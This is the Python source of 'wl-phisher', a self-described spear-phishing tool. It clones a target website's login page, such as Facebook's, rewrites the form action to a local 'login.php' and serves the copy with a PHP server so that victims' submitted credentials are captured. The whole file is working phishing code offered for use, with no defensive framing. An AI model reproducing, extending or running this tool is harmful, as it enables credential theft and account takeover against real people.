import requests
import os
import sys
import time
import random
import string
import argparse
import subprocess as subp
from bs4 import BeautifulSoup

version = "1.1 (Beta)"
url = ""
form_action = ""
form_action_second = ""
str_line_second = ""
str_line = ""
lenght = ""

def echo(x):
    tc = {"d":"0","m":"31","h":"32","c":"36","B":"34","y":"33"}
    for i in tc:
        x = x.replace("\%s" %i, "\033[1;%s;48m" %tc[i])
    x = x.replace("\cl", "\033[1;0;0m")
    print(x)

def update():
    echo("\c[*] Checking Version This Tool ...\d")
    time.sleep(1)
    echo("\h[+] %s\d" %version)
    echo("\c[*] Checking Update ...\d")
    checking = requests.get("https://raw.githubusercontent.com/zexceed12300/wl-phisher/master/Update")
    r = BeautifulSoup(checking.text, "html.parser")
    s = str(r)
    if "1.0 (Beta)" in s:
        echo("\h[+] No Update, This tool is latest version\d")
        sys.exit()
    else:
        update = input("\033[1;33;48m[?] Version %s Is Available, Update Now?[y/n] \033[1;0;0m" %s)
        if "y" in update:
            echo("\m[+] Downloading Package ...")
            with open('Update.log', 'w') as updatelog:
                subp.Popen(['wget', 'https://codeload.github.com/zexceed12300/wl-phisher/zip/master'], stderr=updatelog, stdout=updatelog)
                time.sleep(1)
                echo("\m[+] Unpacking Package ...")
                time.sleep(1)
                subp.Popen(['unzip', 'master'], stderr=updatelog, stdout=updatelog)
                echo("\c[*] Finished.\d")
            sys.exit()
        else:
            sys.exit()

def usage():
    echo("""
           \h_\d    \y_ ____\d  \m_\d      \y_ ____\d   \m_\d
 \h _     _ | |\d     \m____ | |     _  ____ | |     ____  ___\d
 \h| | _ | || |\d \y__\d \m|  _ || |___ |_||  __|| |___ |  _ ||  _|\d
 \h| || || || |\d\y|__|\d\m|  __||  _  || ||__  ||  _  ||  __|| |\d
 \h\_______/|_|\d    \m| |   |_| |_||_||____||_| |_||____||_|\d
     \y_ ____\d      \m|_|\d \cWeb-Login Phisher v1.1 Beta\d \y_ _____\d
               
          \h[ \ySpear Phising Keylogger Attack With\d \h] 
               [ \yCustom Cloned Login Page\d \h]\d
\h---------------------------------------------------------\d
\h[+] Developer\d  \y:\d Xenz@Zexceed12300
\h[+] Contact me\d \y:\d https://www.facebook.com/profile.php?id=100011531026694
\h[+] Github\d     \y:\d https://github.com/zexceed12300
\h[+] Version\d    \y:\d 1.1 (Beta)
\h_________________________________________________________\d               
               """)
usage()

def get_parameters():
    global url
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help='URL page login (e.g. "https://facebook.com/login.php")')
    parser.add_argument("-V", "--version", help='Check version/update', action="store_true")
    args = parser.parse_args()
    url = str(args.url)

    if args.version:
        update()

get_parameters()

def cloning():
    global url
    index_file = open("./HTTPServer/index.html", "w")
    echo("\B[*] Cloning Website ...\d")
    try:
        response = requests.get(url)
    except requests.exceptions.MissingSchema:
        print('[!] URL "%s" Does not exist' %url)
        sys.exit()
    except requests.exceptions.ConnectionError:
        print('[!] URL "%s" Does not exist' % url)
        sys.exit()
    element = BeautifulSoup(response.text, "html.parser")
    content = str(element)
    index_file.write(content)
    index_file.close()
    ori_content = open("./HTTPServer/index.html", "r+")
    for line in ori_content:
        if "<form action=" in line:
            global str_line
            str_line = line
            global lenght
            lenght = str_line.__len__()
        def form_action_label():
            global str_line
            if str_line.__len__() > 200:
                line_len_start_second = str_line.find('<form action="')
                line_len_end_second = str_line.find('method="post"')
                line_second = str_line[line_len_start_second:line_len_end_second]
                global str_line_second
                str_line_second = str(line_second)
                form_len_start_second = str_line_second.find('"', 13)
                form_len_end_second = str_line_second.find(' ', 15)
                global form_action_second
                form_action_second = str_line_second[form_len_start_second:form_len_end_second]
            else:
                form_len_start = str_line.find('"', 13)
                form_len_end = str_line.find(' ', 15)
                global form_action
                form_action = str_line[form_len_start:form_len_end]
        form_action_label()

    s = open("./HTTPServer/index.html").read()
    if form_action.__len__() > str_line_second.__len__():
        replace = s.replace(form_action, '"login.php"')
    else:
        replace = s.replace(form_action_second, '"login.php"')
    f = open("./HTTPServer/index.html", "w")
    f.write(replace)
    f.close()
    print("[+] Saved in ./HTTPServer/index.html")
cloning()

def randomString(stringLength = 10):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))
pw_name = randomString(6)

def server():
    f_pw = open("%s.txt" %pw_name, "w")
    f_pw.close()
    s = open("./HTTPServer/login.php").read()
    os.system("rm ./HTTPServer/login.php")
    pw_replace = s.replace("password", pw_name)
    f_password = open("./HTTPServer/login.php", "w")
    f_password.write(pw_replace)
    f_password.close()
    global url
    url_replace = pw_replace.replace("URL", url)
    f_url = open("./HTTPServer/login.php", "w")
    f_url.write(url_replace)
    f_url.close()

    print("[+] Server Running On Port ==> 127.0.0.1:8080")
    os.system("cd ./HTTPServer && php -S 127.0.0.1:8080")
server()

def flogin_return():
    s = open("./HTTPServer/login.php").read()
    f_undo = open("./HTTPServer/login.php", "w")
    pw_replace = s.replace(pw_name, "password")
    f_undo.write(pw_replace)
    f_undo.close()

    global url
    url_replace = pw_replace.replace(url, "URL")
    f_url = open("./HTTPServer/login.php", "w")
    f_url.write(url_replace)
    f_url.close()
flogin_return()
